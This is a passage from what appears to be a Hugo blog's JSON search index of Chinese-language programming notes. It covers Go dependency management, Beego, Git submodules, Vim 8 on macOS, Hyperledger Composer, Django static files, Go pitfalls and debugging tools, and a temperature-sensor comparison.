    "content": "学习GO开发的过程中发现GO的依赖管理有些不够合理之处。\n首先，使用GO开发时在假设项目及依赖关系都通过全系统唯一的GOPATH进行管理，可事实上一个开发人员不可能同时只做一个项目开发，不能假设不同项目的依赖都是一致的。这个问题自从v1.5引入vendor管理方法得到了一定改善。可是go get对vendor支持并不友好，这增加了管理的工作量。很多项目也被开发出来解决这个问题，比如\u0026rsquo;govendor\u0026rsquo;。\n引入vendor方法后的项目依赖查找顺序如下：\n首先查找当前包下面的vendor目录 向上一级目录查找，直至找到src目录下的vendor目录 在GOPATH下面查找 在GOROOT下面查找 第二个不合理的地方，虽然引入了vendor目录解决单独项目的局部依赖管理问题，但依然要求把每个项目放入系统全局GOPATH中进行管理。可是一个项目可能只是一个大项目中的一小部分，而整个大项目可能有不同的开发语言构成，那么管理这种混合项目就是一个很麻烦的事情。另外每一个项目本身随着开发时间的推移会出现多个版本，当你在处理一个版本的问题是可能需要临时切换到另一个版本，基于同一个GOPATH目录开发时对于这种切换管理也并不算友好。\u0026lsquo;gb\u0026rsquo;这个项目开发出来后解决了这一问题，但这导致了项目管理必须使用gb工具，就连基本的build也脱离不开这种依赖，这也导致了本人碰到的第三个问题。\n第三个不合理之处是对于编辑器的不友好。由于个人的主要编辑器是vim，并且使用了vim-go插件，这个插件支持了Go的开发工具链，可以在vim中方便的使用GoFmt/GoImports/GoBuild/GoTest等这些命令进行开发。但是由于gb对vim的支持欠缺导致在gb创建的项目若不放入标准的GOPATH中有些vim-go的命令执行会出现问题。\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-deps\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/beego\/": {
        
        "title": "Beego",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/beego\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-beego\/": {
        
        "title": "Beego开发入门",
            "tags": [ "Go",  "Beego", ],
    "content": "安装 安装beego： $ go get github.com/astaxie/beego 安装bee开发工具： $ go get github.com/beego/bee $ bee Bee is a Fast and Flexible tool for managing your Beego Web Application. USAGE bee command [arguments] AVAILABLE COMMANDS version Prints the current Bee version migrate Runs database migrations api Creates a Beego API application bale Transforms non-Go files to Go source files fix Fixes your application by making it compatible with newer versions of Beego dlv Start a debugging session using Delve dockerize Generates a Dockerfile for your Beego application generate Source code generator hprose Creates an RPC application based on Hprose and Beego frameworks new Creates a Beego application pack Compresses a Beego application into a single file rs Run customized scripts run Run the application by starting a local development server server serving static content over HTTP on port Use bee help [command] for more information about a command. ADDITIONAL HELP TOPICS Use bee help [topic] for more information about that topic. 基本使用 创建项目 MVC类网页项目 创建普通的web服务类项目使用\u0026rsquo;bee new\u0026rsquo;命令，这类项目遵循通常的MVC代码架构。\n$ bee new test/beego/bee/hello ______ | ___ \\ | |_/ / ___ ___ | ___ \\ / _ \\ / _ \\ | |_/ /| __/| __/ \\____/ \\___| \\___| v1.9.1 2017/11/30 18:50:07 WARN ▶ 0001 You current workdir is not inside $GOPATH/src. 2017/11/30 18:50:07 INFO ▶ 0002 Creating application... create Your_GOPATH/src/test/beego/bee/hello/ create Your_GOPATH/src/test/beego/bee/hello/conf/ create Your_GOPATH/src/test/beego/bee/hello/controllers/ create Your_GOPATH/src/test/beego/bee/hello/models/ create Your_GOPATH/src/test/beego/bee/hello/routers/ create Your_GOPATH/src/test/beego/bee/hello/tests/ create Your_GOPATH/src/test/beego/bee/hello/static/ create Your_GOPATH/src/test/beego/bee/hello/static/js/ create Your_GOPATH/src/test/beego/bee/hello/static/css/ create Your_GOPATH/src/test/beego/bee/hello/static/img/ create Your_GOPATH/src/test/beego/bee/hello/views/ create Your_GOPATH/src/test/beego/bee/hello/conf/app.conf create Your_GOPATH/src/test/beego/bee/hello/controllers/default.go create Your_GOPATH/src/test/beego/bee/hello/views/index.tpl create Your_GOPATH/src/test/beego/bee/hello/routers/router.go create Your_GOPATH/src/test/beego/bee/hello/tests/default_test.go create Your_GOPATH/src/test/beego/bee/hello/main.go 2017/11/30 18:50:07 SUCCESS ▶ 0003 New application successfully created! Web service类项目 如果项目是web service类型的则可以使用\u0026rsquo;bee api\u0026rsquo;来创建，这类项目创建完后比\u0026rsquo;bee new\u0026rsquo;类的项目省略\u0026rsquo;static\u0026rsquo;及\u0026rsquo;views\u0026rsquo;目录部分的内容。\n运行项目 使用bee运行项目也非常简单，直接在项目代码目录下运行\u0026rsquo;bee run\u0026rsquo;即可，运行完后\n$ bee run ______ | ___ \\ | |_/ / ___ ___ | ___ \\ / _ \\ / _ \\ | |_/ /| __/| __/ \\____/ \\___| \\___| v1.9.1 2017/11/30 19:11:02 INFO ▶ 0001 Using \u0026#39;hello\u0026#39; as \u0026#39;appname\u0026#39; 2017/11/30 19:11:02 INFO ▶ 0002 Initializing watcher... 2017/11/30 19:11:03 SUCCESS ▶ 0003 Built Successfully! 2017/11/30 19:11:03 INFO ▶ 0004 Restarting \u0026#39;hello\u0026#39;... 2017/11/30 19:11:03 SUCCESS ▶ 0005 \u0026#39;./hello\u0026#39; is running... 2017/11/30 19:11:03 [I] [asm_amd64.s:2337] http server Running on http://:8080 进阶开发 Route 项目创建后的router文件在“routers/router.go”\n1 2 3 4 5 6 7 8 9 10 package routers import ( \u0026#34;wangq/test/beego/bee/hello/controllers\u0026#34; \u0026#34;github.com/astaxie/beego\u0026#34; ) func init() { beego.Router(\u0026#34;/\u0026#34;, \u0026amp;controllers.MainController{}) } 创建一条router记录的方法是调用“beego.Router”方法，并提供两个参数：\nURI：请求的URI记录，比如\u0026quot;/\u0026quot; Controller：处理该请求的Controller Controller bee创建的项目controller位于“controllers/default.go”文件中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package controllers import ( \u0026#34;github.com/astaxie/beego\u0026#34; ) type MainController struct { beego.Controller } func (c *MainController) Get() { c.Data[\u0026#34;Website\u0026#34;] = \u0026#34;beego.me\u0026#34; c.Data[\u0026#34;Email\u0026#34;] = \u0026#34;astaxie@gmail.com\u0026#34; c.TplName = \u0026#34;index.tpl\u0026#34; } 项目的\u0026rsquo;MainController\u0026rsquo;继承自\u0026rsquo;beego.Controller\u0026rsquo;，\u0026lsquo;beego.Controller\u0026rsquo;中定义了interface \u0026lsquo;ControllerInterface\u0026rsquo;用于处理HTTP请求，这些接口包括\u0026quot;Init, Prepare, Post, Get, Delete, Head\u0026quot;等，因此\u0026rsquo;MainController\u0026rsquo;可以通过实现这些方法来处理相应的请求。\n在默认创建的controller中包括了\u0026rsquo;Get()\u0026lsquo;方法，该方法用来处理HTTP \u0026lsquo;GET\u0026rsquo;请求。\nGet()方法： c.Data: 处理方法主要是利用\u0026rsquo;c.Data\u0026rsquo;这个map（数据类型为：map[interface{}]interface{}）来存放返回的数据，其中的信息可以被template引用并render。\nc.TplName: 指定template文件名字，如果不指定这个名字那么beego会尝试使用\u0026rsquo;controller/method_name.tpl\u0026rsquo;名字的文件作为模版。\nView beego使用go内建的html/template模版引擎，可以参考这个使用方法。\n下面是例子模版，其中\u0026rsquo;{{.Website}}\u0026lsquo;及\u0026rsquo;{{.Email}}\u0026lsquo;是通过Controller的Data map提供给模版的参数。\n... \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1 class=\u0026#34;logo\u0026#34;\u0026gt;Welcome to Beego\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;description\u0026#34;\u0026gt; Beego is a simple \u0026amp; powerful Go web framework which is inspired by tornado and sinatra. \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;div class=\u0026#34;author\u0026#34;\u0026gt; Official website: \u0026lt;a href=\u0026#34;http://{{.Website}}\u0026#34;\u0026gt;{{.Website}}\u0026lt;/a\u0026gt; / Contact me: \u0026lt;a class=\u0026#34;email\u0026#34; href=\u0026#34;mailto:{{.Email}}\u0026#34;\u0026gt;{{.Email}}\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;div class=\u0026#34;backdrop\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;/static/js/reload.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Model GO语言相关的几个常用数据库支持如下：\nMySQL：github.com/go-sql-driver/mysql PostgreSQL：github.com/lib/pq Sqlite3：github.com/mattn/go-sqlite3 beego架构 工作流程： 详细执行流程： 参考 beego应用框架之入门 ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-beego\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/git\/": {
        
        "title": "Git",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/git\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/git\/": {
        
        "title": "Git",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/git\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/git-submodule\/": {
        
        "title": "Git Submodule使用方法",
            "tags": [ "git",  "submodule", ],
    "content": "假设有两个项目project1和project2代码仓库：\n$ ls project1/ HEAD branches config description hooks info objects refs $ ls project2/ HEAD branches config description hooks info objects refs 1. 从代码仓库clone开发库p1/p2 $git clone ../project1 p1 Cloning into \u0026#39;p1\u0026#39;... warning: You appear to have cloned an empty repository. done. $ git clone ../project2 p2 Cloning into \u0026#39;p2\u0026#39;... warning: You appear to have cloned an empty repository. done. 2. 对p1/p2做一些改动并且push到原代码仓库 在p1中添加新文件file1并且push到远程库project1\n$ touch file1 $ git add file1 $ git commit [master (root-commit) 9132026] Init project 1 with file1 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 file1 在p2中添加新文件file2并且push到远程库project2\n$ touch file2 $ git add file2 $ git commit [master (root-commit) 0e07357] Init project2 with file2 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 file2 3. 在开发库p1代码库中添加submodule \u0026lsquo;project2\u0026rsquo; 使用submodule add命令添加submodule到当前git代码库中，执行完成后submodule代码也会被clone到对应的目标目录。\ngit submodule add \u0026lt;URL to submodule remote\u0026gt; \u0026lt;submodule local dir\u0026gt; 例如：\n$ git submodule add ../../project2 submodule/p2 此时代码已经被拉到本地submodule目录下，查看一下submodule目录已经同步好project2的代码：\n$ ls file1 submodule $ ls submodule/p2/ file2 在project1目录中多出一个\u0026rsquo;.gitmodules\u0026rsquo;文件，该文件包含submodule信息：\n$ cat .gitmodules [submodule \u0026#34;submodule/p2\u0026#34;] path = submodule/p2 url = /Users/wangq/tmp/submodule/project2 $ git submodule 0e0735740297cce3ef051c9c84d20d032d03311a submodule/p2 (heads/master) 这时候需要添加初始化一下这个submodule\ngit submodule init git submodule update 初始化后在主代码库目录中可以查看到submodule相关的两个改动，这两个改动可以被commit。\n$ git status On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes to be committed: (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) new file: .gitmodules new file: submodule/p2 $ git commit [master 5d40507] Create submodule inside p1\u0026#39;s working repository 2 files changed, 4 insertions(+) create mode 100644 .gitmodules create mode 160000 submodule/p2 4. 此时如果project2的开发人员更新了project2的代码，我们可以把最新的代码同步到submodule中 $ git pull remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Unpacking objects: 100% (3/3), done. From /Users/wangq/tmp/submodule/project2 0e07357..db4f02b master -\u0026gt; origin/master Updating 0e07357..db4f02b Fast-forward file2 | 1 + 1 file changed, 1 insertion(+) 查看一下其他人的改动内容如下：\n$ cat file2 This line is change from another\u0026#39;s working reposiroty 5.在p1中的submodule对project2进行了修改后也可以把新的修改发不到project2的远程库，这样project2的开发人员可以同步到最新的代码。 在p1的submodule目录中对p2进行修改并本地提交，然后把submodule的修改推到project2远程库中：\n$ git push origin master Counting objects: 3, done. Delta compression using up to 4 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 335 bytes | 111.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0) To /Users/wangq/tmp/submodule/project2 db4f02b..f600361 master -\u0026gt; master 这是project2的其他开发人员可以在自己的代码库中同步这部分修改内容： $ git pull origin master remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Unpacking objects: 100% (3/3), done. From /Users/wangq/tmp/submodule/test/../project2 * branch master -\u0026gt; FETCH_HEAD db4f02b..f600361 master -\u0026gt; origin/master Updating db4f02b..f600361 Fast-forward file2 | 1 + 1 file changed, 1 insertion(+)\n查看修改内容：\n$ cat file2 This line is change from another\u0026#39;s working reposiroty This line is chaneg from p1\u0026#39;s submodule repository \u0026lt;-- 这一行是p1开发人员增加的内容 使用中碰到的问题 Trap 1: \u0026ldquo;Server does not allow request for unadvertised object\u0026rdquo; $ git submodule update --checkout error: Server does not allow request for unadvertised object 55e720e9c4ca96ae1d1bde84a1db3a12c90b9700 Fetched in submodule path \u0026#39;submodule/p2\u0026#39;, but it did not contain 55e720e9c4ca96ae1d1bde84a1db3a12c90b9700. Direct fetching of that commit failed. 原因： 出现这个问题的原因是在submodule中进行的修改虽然已经commit到了superproject中，甚至是push到了superproject的远程库，但是当另外一个人尝试把这个superproject抓下来并同步这个submodule中的修改时，如果submodule的改动并未push到其对应的remote库，那么就会出现这个问题，因为update尝试从sudmobule的远程库pull对应的改动(55e720e9c4ca96ae1d1bde84a1db3a12c90b9700)，而这个改动并未被push到远程库，因此也就不存在。\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/git-submodule\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/submodule\/": {
        
        "title": "Submodule",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/submodule\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/mac\/": {
        
        "title": "Mac",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/mac\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/vim-8-mac\/": {
        
        "title": "Vim 8 Mac",
            "tags": [ "vim8",  "mac", ],
    "content": "安装vim8 $ xcode-select --install $ ./configure --enable-luainterp=yes --enable-perlinterp=yes --enable-pythoninterp=yes --enable-tclinterp=yes --enable-rubyinterp=yes --enable-cscope --with-lua-prefix=/usr/local --enable-terminal --enable-multibyte --with-features=huge $ make $ make install 安装插件 安装YouCompleteMe: $ ./install.py --clang-completer --go-completer --js-completer vim folding 命令 功能 za 打开/关闭当前的折叠 zc 关闭当前打开的折叠 zo 打开当前的折叠 zm 关闭所有折叠 zM 关闭所有折叠及其嵌套的折叠 zr 打开所有折叠 zR 打开所有折叠及其嵌套的折叠 zd 删除当前折叠 zE 删除所有折叠 zj 移动至下一个折叠 zk 移动至上一个折叠 zn 禁用折叠 zN 启用折叠 Issues macos iTerm启动vim后第一行显示\u0026rsquo;$p\u0026rsquo;字符 解决方法：把终端类型从xterm或者xterm-256color改为linux\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/vim-8-mac\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/vim8\/": {
        
        "title": "Vim8",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/vim8\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hyperledger\/": {
        
        "title": "Hyperledger",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hyperledger\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/technology\/blockchain\/hyperledger-intro\/": {
        
        "title": "Hyperledger Intro",
            "tags": [ "Blockchain",  "Hyperledger", ],
    "content": "Hyperledger项目：\nHyperledger Fabric Hyperledger Sawtooth Hyperledger Composer 模型：\nAssets(资产) 一般定义方式：\n/** * A vehicle asset. */ asset Vehicle identified by vin { o String vin } 继承方式：\n/** * A car asset. A car is related to a list of parts */ asset Car extends Vehicle { o String model --\u0026gt; Part[] Parts } 抽象方式：\n/** * An abstract Vehicle asset. */ abstract asset Vehicle identified by vin { o String vin } Participants(参与者)\n/** * An enumerated type */ enum ProductType { o DAIRY o BEEF o VEGETABLES } participant Farmer identified by farmerId { o String farmerId o ProductType primaryProduct } Transactions(事务)\nConcepts(概念)\nabstract concept Address { o String street o String city default =\u0026quot;Winchester\u0026quot; o String country default = \u0026quot;UK\u0026quot; o Integer[] counts optional } concept UnitedStatesAddress extends Address { o String zipcode } http://www.8btc.com/blockchain-poc-hyperledger\nTest:\n概念：\nBND: business network definition (BND) ", 
    "url": "http:\/\/localhost:1313\/post\/technology\/blockchain\/hyperledger-intro\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/django\/": {
        
        "title": "Django",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/django\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/django-static\/": {
        
        "title": "Django静态文件配置",
            "tags": [ "Django",  "static file", ],
    "content": "配置项：\n配置项 说明 例子 STATIC_URL 用户通过web访问静态文件时的URL前缀部分 STATIC_URL=\u0026quot;/static/\u0026quot; STATIC_ROOT manager.py collectstatic执行后静态文件会收集存放到 STATIC_ROOT = os.path.join(BASE_DIR, \u0026lsquo;collected_static\u0026rsquo;) STATICFILES_DIRS 每个app目录中可以创建一个static目录存放对应的静态文件，也可以通过在settings文件中指定STATICFILES_DIRS来指定一个公共的位置存放静态文件 STATICFILES_DIRS = ( os.path.join(BASE_DIR, \u0026ldquo;common_static\u0026rdquo;), \u0026lsquo;/path/to/others/static/\u0026rsquo;, # 指定一个目录) STATICFILES_FINDERS 指定静态文件查找器 STATICFILES_FINDERS = ( \u0026ldquo;django.contrib.staticfiles.finders.FileSystemFinder\u0026rdquo;, \u0026ldquo;django.contrib.staticfiles.finders.AppDirectoriesFinder\u0026rdquo;) DEBUG 如果指定\u0026rsquo;DEBUG=True\u0026rsquo;，那么Django通过STATICFILES_FINDERS指定的查找器寻找静态文件。如果指定\u0026rsquo;DEBUG=False\u0026rsquo;，那么Django不会负责静态文件访问服务，这时可以通过apache或者nginx提供静态文件服务，访问前一般通过\u0026rsquo;collectstatic\u0026rsquo;把项目静态文件收集好后统一部署。 ", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/django-static\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/static-file\/": {
        
        "title": "Static File",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/static-file\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-lang-traps\/": {
        
        "title": "Go语言编程陷阱",
            "tags": [ "golang", ],
    "content": "陷阱1: \u0026ldquo;is pointer to interface, not interface\u0026rdquo; 执行下面代码会出现\u0026quot;type *net.Conn is pointer to interface, not interface)\u0026ldquo;错误，原因是因为\u0026quot;net.Conn\u0026quot;是interface而不是struct，不能用指针方式传递。\n1 2 3 4 5 6 7 8 9 func connHandler(client *net.Conn) { // do something } func somefunc() { // ... client, _ := listener.Accept() connHandler(\u0026amp;client) } GO语言中interface是一种特殊的数据结构，包含两部分内容：\n一个指向方法表的指针 一个指向实际数据的指针 因为这种特殊的数据结构所以interface的指针指向的结构既没有实际数据也没有对应方法，那么就无法直接访问所需的内容，鉴于此原因我推测GO语言的开发者直接屏蔽掉了指向interface指针的用法。这种情况的正确如下：\n1 2 3 4 5 6 7 8 9 func connHandler(client net.Conn) { // do something } func somefunc() { // ... client, _ := listener.Accept() connHandler(client) } 陷阱2: \u0026ldquo;net.ReadFromUDP 未 block导致高CPU占用\u0026rdquo; 在做UDP服务器端开发时需要用到net.ReadFromUDP()来获取客户端发送来的数据，根据这个函数定义需要传入一个\u0026rsquo;[] byte\u0026rsquo;的参数用于接收客户端数据。如果此处传入的参数是一个长度为0的slice的话就会导致CPU占满的问题。\n函数定义：\nfunc (c *UDPConn) ReadFromUDP(b []byte) (int, *UDPAddr, error) ReadFromUDP acts like ReadFrom but returns a UDPAddr. 问题代码： var data []byte // create a slice with length of 0 n, remoteAddr, err := conn.ReadFromUDP(data) // the call will return as soon as it\u0026#39;s called if err != nil { fmt.Println(\u0026#34;Error read UDP:\u0026#34;, err.Error()) }\n正确代码： var data = make([]byte, 1024) // make([]byte, 0, 1024) doesn\u0026#39;t work either n, remoteAddr, err := conn.ReadFromUDP(data) // the call will block until there is data if err != nil { fmt.Println(\u0026#34;Error read UDP:\u0026#34;, err.Error()) }\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-lang-traps\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/projects\/": {
        
        "title": "Projects",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/projects\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/delve\/": {
        
        "title": "Delve",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/delve\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-utils\/": {
        
        "title": "GO开发技巧",
            "tags": [ "Go",  "vim",  "delve", ],
    "content": "1. 设置GO语言vim开发环境 在vim中开发GO最好安装相关的插件，比如vim-go这个插件。这个插件除了提供格式化、语法高亮、语法检测等功能以外还有很多方便的功能。\n编译命令，对应go build：\n:GoBuild 安装，对应go install：\n:GoInstall 测试，对应go test：\n:GoTest 运行一个单独测试：\n:GoTestFunc 覆盖率：\n:GoCoverage 运行当前程序，对应go run:\n:GoRun goto符号定义：\n:GoDef 文档查询：\n:GoDoc :GoDocBrowser 添加／删除包引用：\n:GoImport :GoDrop 设置GOPATH：\n:GoPath 在结构体增加／删除tag：\n:GoAddTags :GoRemoveTags 静态语法检查：\n:GoMetaLinter\t// 调用gometalinter :GoLint\t// 调用golint 高级代码分析：\n:GoImplements :GoCallees :GoReferrers 重命名：\n:GoRename 在vim中查询vim-go的帮助文档： :help vim-go 安装完成后打开vim，运行\u0026quot;:GoInstallBinaries\u0026quot;安装依赖的工具。\n再安装其它依赖工具：\n// gocode is used by many editors to provide intellisense go get github.com/nsf/gocode // goimports is something you should run when saving code to fill in import paths go get golang.org/x/tools/cmd/goimports // gorename is used by many editors to provide identifier rename support go get golang.org/x/tools/cmd/gorename // oracle is a tool that help with code navigation and search go get golang.org/x/tools/cmd/oracle // golint should be run after every build to check your code go get github.com/golang/lint/golint 2. 其它常用工具 文件格式化 gofmt \u0026lt;file\u0026gt; 打印package信息 查询当前目录模块信息：\ngo list 查询指定模块：\ngo list \u0026lt;module\u0026gt; 常用命令：\ngo list -f '{{ .Name }}' go list -f '{{ .Name }}: {{ .Doc }}' go list -f '{{ .Imports }}' // 结果用中括号输出 $ go list -f '{{.Imports}}' fmt [errors io math os reflect strconv sync unicode/utf8] go list -f '{{ join .Imports \u0026quot;\\n\u0026quot;}}' // 结果用换行输出 $ go list -f '{{join .Imports \u0026quot;\\n\u0026quot;}}' fmt errors io math os reflect strconv sync unicode/utf8 跨平台编译： GOOS=windows go build 查询文档 查询当前模块：\ngo doc 查询指定模块：\ngo doc \\\u0026lt;module\\\u0026gt; go doc \\\u0026lt;module\\\u0026gt; [function] 在线文档：\ngodoc -http :8080 程序错误查询 程序执行的时候有些情况下不会打印错误信息，因为go中没有exception，当错误出现时是通过返回error来捕捉错误信息，如果程序执行的时候没有捕捉错误信息，那么就会出现这种状况。对于这种状况可以通过命令\u0026quot;errcheck\u0026quot;来获得错误信息。\n命令： errcheck go vet工具 go vet工具用来检查程序中可能的错误。\n3. 测试 如何添加测试 通常在被测试的程序文件同目录下添加\u0026rsquo;_test.go\u0026rsquo;结尾的文件，例如当要测试\u0026rsquo;program.go\u0026rsquo;时在同一个目录下添加\u0026rsquo;program_test.go\u0026rsquo;文件。\n接下来是在\u0026rsquo;program_test.go\u0026rsquo;文件中添加测试代码。测试文件需要引入\u0026rsquo;testing\u0026rsquo;包。接下来是编写测试函数，测试函数需要\u0026rsquo;Test\u0026rsquo;字符开头，注意必须是大写\u0026rsquo;T\u0026rsquo;开头的\u0026rsquo;Test\u0026rsquo;。\n例如：\nimport \u0026quot;testing\u0026quot; func TestSomeFunction(t *testing.T) { // do some test here } table driven test go测试推荐\u0026rsquo;table drive test\u0026rsquo;的方法，其实是一种编程技巧，使用这种方法可以在一定程度上简化测试代码。\n这种测试方法其实是将测试的输入／输出作为测试数据写在一个结构体内，并在测试代码中使用，写个简单的例子，比如说要测试一个简单的\u0026rsquo;sum\u0026rsquo;函数。\nfunc sum(a int, b int) int { return (a+b) } 测试代码：\n// you're defining the test table here var testCases = []struct { a int b int result int }{ {1, 2, 3}, {3, 5, 8}, } // test code func TestSum(t *testing.T) { for _, tc := range testCases { r := sum(tc.a, tc.b) if r != tc.result { t.Errorf(\u0026quot;Failed case: param[%d, %d], result[%d], expected[%d]\u0026quot;, tc.a, tc.b, r, tc.result) } } } stdout重定向测试 关于stdout重定向测试并不是一个测试的重点，只是有时候你写的一个函数需要输出一些字符到标准输出stdout上，比如使用fmt.Println()，如果此时恰好需要测试程序检测这种情况，那么这种技巧就可以派上用场了。\n比如有下面这样一段程序：\nfunc isNegative(i int) { if i \u0026lt; 0 { fmt.Println(\u0026quot;Negative\u0026quot;) } else { fmt.Println(\u0026quot;Non-negative\u0026quot;) } } 这个程序的测试可以这样写：\nfunc captureStdoutWithParam(f func(p int), p int) string { // save the original stdout oldStdout := os.Stdout // create pipe to redirect the stdout to 'r' r, w, _ := os.Pipe() os.Stdout = w f(p) w.Close() // restore the stdout os.Stdout = oldStdout out, _ := ioutil.ReadAll(r) return string(out) } func TestIsNegative(t *testing.T) { cases := []struct { input int output string }{ {-3, \u0026quot;Negative\u0026quot;}, {0, \u0026quot;Non-negative\u0026quot;}, {5, \u0026quot;Non-negative\u0026quot;}, } for _, c := range cases { out := captureStdoutWithParam(isNegative, c.input) if !strings.Contains(out, c.output) { t.Errorf(\u0026quot;Expected [%s], get[%s]\u0026quot;, c.output, out) } } } 4. debug go语言debug有几个选项：\ngdb godebug Delve gdb 关于gdb的使用go的官方文档似乎并不推荐。\nThis applies to the standard toolchain (the gc Go compiler and tools). Gccgo has native gdb support. Besides this overview you might want to consult the GDB manual.\nGDB does not understand Go programs well. The stack management, threading, and runtime contain aspects that differ enough from the execution model GDB expects that they can confuse the debugger, even when the program is compiled with gccgo. As a consequence, although GDB can be useful in some situations, it is not a reliable debugger for Go programs, particularly heavily concurrent ones. Moreover, it is not a priority for the Go project to address these issues, which are difficult. In short, the instructions below should be taken only as a guide to how to use GDB when it works, not as a guarantee of success.\ngodebug 在godebug的github上也表明这个工具已经过时了，并且推荐使用\u0026rsquo;delve\u0026rsquo;。\nDEPRECATED! There will be no further development. Please use https://github.com/derekparker/delve. But if you want to keep the project going and ready to become its maintaner please contact us and we can make you one.\ndelve 安装 参考github文档中的安装方法。\n方法一：\n$ brew install go-delve/delve/delve 方法二：\n$ xcode-select --install $ go get -u github.com/derekparker/delve/cmd/dlv 接下来就可以使用dlv进行debug了。\n$ dlv --help Delve is a source level debugger for Go programs. Delve enables you to interact with your program by controlling the execution of the process, evaluating variables, and providing information of thread / goroutine state, CPU register state and more. The goal of this tool is to provide a simple yet powerful interface for debugging Go programs. Pass flags to the program you are debugging using `--`, for example: `dlv exec ./hello -- server --config conf/config.toml` Usage: dlv [command] Available Commands: attach Attach to running process and begin debugging. connect Connect to a headless debug server. core Examine a core dump. debug Compile and begin debugging main package in current directory, or the package specified. exec Execute a precompiled binary, and begin a debug session. help Help about any command run Deprecated command. Use 'debug' instead. test Compile test binary and begin debugging program. trace Compile and begin tracing program. version Prints version. Flags: --accept-multiclient Allows a headless server to accept multiple client connections. Note that the server API is not reentrant and clients will have to coordinate. --api-version int Selects API version when headless. (default 1) --backend string Backend selection: default\tUses lldb on macOS, native everywhere else. native\tNative backend. lldb\tUses lldb-server or debugserver. rr\tUses mozilla rr (https://github.com/mozilla/rr). (default \u0026quot;default\u0026quot;) --build-flags string Build flags, to be passed to the compiler. --headless Run debug server only, in headless mode. --init string Init file, executed by the terminal client. -l, --listen string Debugging server listen address. (default \u0026quot;localhost:0\u0026quot;) --log Enable debugging server logging. --wd string Working directory for running the program. (default \u0026quot;.\u0026quot;) Use \u0026quot;dlv [command] --help\u0026quot; for more information about a command. ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/go-utils\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/vim\/": {
        
        "title": "Vim",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/vim\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ds18b20\/": {
        
        "title": "DS18B20",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ds18b20\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/pt100\/": {
        
        "title": "PT100",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/pt100\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/sensor\/": {
        
        "title": "Sensor",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/sensor\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/temp-sensor-comparasion\/": {
        
        "title": "Temp Sensor Comparasion",
            "tags": [ "DS18B20",  "PT100", ],
    "content": "DS18B20 PT100\nDS18B20 PT100 器件稳定性 温度测量范围 -55～125℃ -200～850℃ 测温时延 精度偏差 +-0.5℃ B级别可达0.5%，精度较高，但需要校准 年漂移量 工作电压 3-5.5V 体积 稍大，探头直径6mm 较小，探头直径5mm 引线长度 最长30米 信号接口数量 3 2 成本 寿命 开发难度 容易，直接数字信号输出 相对复杂，需要校准 特点 具有体积小、硬件开销低、抗干扰能力强、精度高的特点 ", 
